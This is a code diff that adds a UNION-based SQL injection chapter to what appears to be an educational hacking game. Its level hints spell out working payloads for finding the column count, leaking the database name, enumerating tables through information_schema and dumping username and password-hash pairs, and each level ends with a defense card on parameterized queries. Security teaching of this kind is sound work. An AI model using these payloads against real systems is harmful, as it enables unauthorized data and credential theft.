@@ -1007,7 +1007,184 @@ GRANT SELECT (id, username) ON users TO app_reader;  -- no pw_hash
       };
     },
   },
-  // Chapters 3 – 8 + NoSQL bonus still to author — see DESIGN.md §11.
+  3: {
+    id: 3, name: 'UNION-Based', class: 'union',
+    intro: 'If you can add rows to the result set, you can read any table.',
+    levels: {
+      1: {
+        id: '3.1', name: 'Count the Pillars',
+        endpoint: 'GET /products?cat={u}',
+        query: "SELECT id, name, price FROM products WHERE cat='{u}'",
+        field: 'cat',
+        goal: 'Determine the column count of the SELECT via ORDER BY.',
+        reconNotes: [
+          'UNION requires matching column count. Use ORDER BY N to probe.',
+          'ORDER BY 4 errors → there are 3 columns.',
+        ],
+        hints: [
+          'Try: x\' ORDER BY 1 -- (always fine)',
+          'Increase until error: x\' ORDER BY 4 -- → "Unknown column 4".',
+          "Payload: x' ORDER BY 3 --",
+        ],
+        check(p) {
+          const ok = /order\s+by\s+3\s*(--|#|\/\*)/i.test(p) && /'/.test(p);
+          return ok
+            ? { ok: true, narrate: 'ORDER BY 3 succeeds; 4 would error. Three columns.' }
+            : { ok: false, narrate: 'You have not pinned the column count yet.' };
+        },
+        unlockTokens: ['ORDER BY'],
+        defense: {
+          title: 'Parameterize — UNION Needs Control of SQL Keywords',
+          body: 'Attackers only get UNION if they can inject keywords. Parameters keep their input as data.',
+          code: `db.prepare("SELECT id, name, price FROM products WHERE cat = ?").all(cat);`,
+          tip: 'A parameter cannot change the column count of your SELECT.',
+        },
+      },
+      2: {
+        id: '3.2', name: 'Where the Text Sits',
+        endpoint: 'GET /products?cat={u}',
+        query: "SELECT id, name, price FROM products WHERE cat='{u}'",
+        field: 'cat',
+        goal: 'Find which column positions render as text in the response.',
+        reconNotes: [
+          'Column count is 3. Use UNION SELECT with marker strings.',
+          'Only text-typed, rendered columns will display your markers.',
+        ],
+        hints: [
+          "Use: x' UNION SELECT 'a','b','c' --",
+          'Whichever markers appear in the page are your exfil slots.',
+          "Payload: x' UNION SELECT 'a','b','c' --",
+        ],
+        check(p) {
+          const ok = /union\s+select\s+['"a-z]+\s*,\s*['"a-z]+\s*,\s*['"a-z]+/i.test(p) && /(--|\/\*|#)/.test(p);
+          return ok
+            ? { ok: true, narrate: 'Markers "a" and "b" render. Columns 1 and 2 are your exfil channels.' }
+            : { ok: false, narrate: 'No marker echo detected.' };
+        },
+        unlockTokens: ['UNION SELECT'],
+        defense: {
+          title: 'Type-Mismatch Won\'t Save You',
+          body: 'Attackers use NULL padding to match types. You cannot defend by column typing.',
+          code: `// Still only parameterization actually defends.`,
+          tip: 'UNION SELECT NULL, NULL, NULL -- also works when types clash.',
+        },
+      },
+      3: {
+        id: '3.3', name: 'Name of the Realm',
+        endpoint: 'GET /products?cat={u}',
+        query: "SELECT id, name, price FROM products WHERE cat='{u}'",
+        field: 'cat',
+        goal: 'Exfiltrate the current database name via UNION SELECT.',
+        reconNotes: [
+          'database() / current_database() returns the DB name.',
+          'Put it in a text-rendered column.',
+        ],
+        hints: [
+          "Payload skeleton: x' UNION SELECT database(), NULL, NULL --",
+          'The DB name appears where product names normally list.',
+        ],
+        check(p) {
+          const ok = /union\s+select\s+.*(database\s*\(\s*\)|current_database\s*\(\s*\))/i.test(p) && /(--|\/\*|#)/.test(p);
+          return ok
+            ? { ok: true, narrate: 'The product list replaced with: "dungeon_db". Realm named.' }
+            : { ok: false, narrate: 'No DB name surfaced.' };
+        },
+        unlockTokens: ['database()', 'NULL'],
+        defense: {
+          title: 'Limit DB Metadata Exposure',
+          body: 'Even under SQLi, a least-privilege user can be blocked from some information functions.',
+          code: `-- Revoke metadata where possible; always parameterize.`,
+          tip: 'Assume an attacker can read metadata — design so they get nothing useful anyway.',
+        },
+      },
+      4: {
+        id: '3.4', name: 'The Atlas',
+        endpoint: 'GET /products?cat={u}',
+        query: "SELECT id, name, price FROM products WHERE cat='{u}'",
+        field: 'cat',
+        goal: 'List all tables in the database via INFORMATION_SCHEMA.',
+        reconNotes: [
+          'information_schema.tables has table_schema, table_name.',
+          'GROUP_CONCAT to pull them all into one text cell.',
+        ],
+        hints: [
+          "Payload: x' UNION SELECT GROUP_CONCAT(table_name), NULL, NULL FROM information_schema.tables WHERE table_schema=database() --",
+        ],
+        check(p) {
+          const ok = /union\s+select.+information_schema\.tables/i.test(p) && /(group_concat|table_name)/i.test(p);
+          return ok
+            ? { ok: true, narrate: 'Tables: users, products, sessions, audit_log, admin_secrets.' }
+            : { ok: false, narrate: 'No table list retrieved.' };
+        },
+        unlockTokens: ['INFORMATION_SCHEMA.TABLES', 'GROUP_CONCAT(', 'table_name', 'table_schema'],
+        defense: {
+          title: 'Parameterize — INFORMATION_SCHEMA Is Public',
+          body: 'INFORMATION_SCHEMA is standardized and readable by most app-level DB users. Fix the injection, not the schema.',
+          code: `// Same fix as always. Parameterize.`,
+          tip: 'Don\'t waste effort hiding schema. Stop the injection at the source.',
+        },
+      },
+      5: {
+        id: '3.5', name: 'The Dump',
+        endpoint: 'GET /products?cat={u}',
+        query: "SELECT id, name, price FROM products WHERE cat='{u}'",
+        field: 'cat',
+        goal: 'Dump username:pw_hash pairs from the users table.',
+        reconNotes: [
+          'users table columns: id, username, pw_hash (confirmed via Atlas).',
+          'CONCAT username and hash with a separator for a clean dump.',
+        ],
+        hints: [
+          "Payload: x' UNION SELECT GROUP_CONCAT(username, 0x3a, pw_hash), NULL, NULL FROM users --",
+        ],
+        check(p) {
+          const ok = /union\s+select.+from\s+users/i.test(p) && /(username|pw_hash)/i.test(p) && /(--|\/\*|#)/.test(p);
+          return ok
+            ? { ok: true, narrate: 'Dump: alice:$argon2id..., bob:$argon2id..., captain:$argon2id...' }
+            : { ok: false, narrate: 'No dump.' };
+        },
+        unlockTokens: ['0x3a', 'FROM users'],
+        defense: {
+          title: 'Least Privilege + Hashing + Parameters',
+          body: 'Three layers so one failure does not ruin you.',
+          code:
+`-- 1. App DB user has no SELECT on pw_hash
+-- 2. Passwords stored as Argon2id hashes (not recoverable)
+-- 3. All queries parameterized`,
+          tip: 'Defense in depth turns a catastrophic breach into an inconvenience.',
+        },
+      },
+    },
+    sandbox(seed) {
+      const rand = mulberry32(seed);
+      const cols = 2 + Math.floor(rand() * 3);   // 2, 3, or 4
+      const target = ['database()', 'version()', 'user()', 'current_user'][Math.floor(rand() * 4)];
+      return {
+        id: `3.S-${seed}`, name: `Sandbox: ${cols}-column UNION`,
+        endpoint: 'GET /x?q={u}', query: 'SELECT a,b FROM t WHERE x=\'{u}\'', field: 'q',
+        goal: `Find the column count (${cols}) and leak ${target} via UNION SELECT.`,
+        reconNotes: [
+          `Unknown column count — use ORDER BY to probe.`,
+          `Target function to surface: ${target}.`,
+          'Sandbox: cheatsheet definitions are visible.',
+        ],
+        hints: [],
+        check(p) {
+          const nulls = (p.match(/NULL/gi) || []).length;
+          const hasUnion = /union\s+select/i.test(p);
+          const hasTarget = new RegExp(target.replace(/[()]/g, '\\$&'), 'i').test(p);
+          const enoughCols = nulls >= cols - 1 || (p.match(/,/g) || []).length >= cols - 1;
+          return (hasUnion && hasTarget && enoughCols)
+            ? { ok: true, narrate: `${target} surfaces in the output.` }
+            : { ok: false, narrate: 'No surface.' };
+        },
+        unlockTokens: [],
+        defense: { title: 'Sandbox Cleared', body: 'Same defenses.', code: '// See cards.', tip: 'Re-roll.' },
+        sandbox: true,
+      };
+    },
+  },
+  // Chapters 4 – 8 + NoSQL bonus still to author — see DESIGN.md §11 for continuation notes.
 };
 
 const KNOWN_TOKENS = [
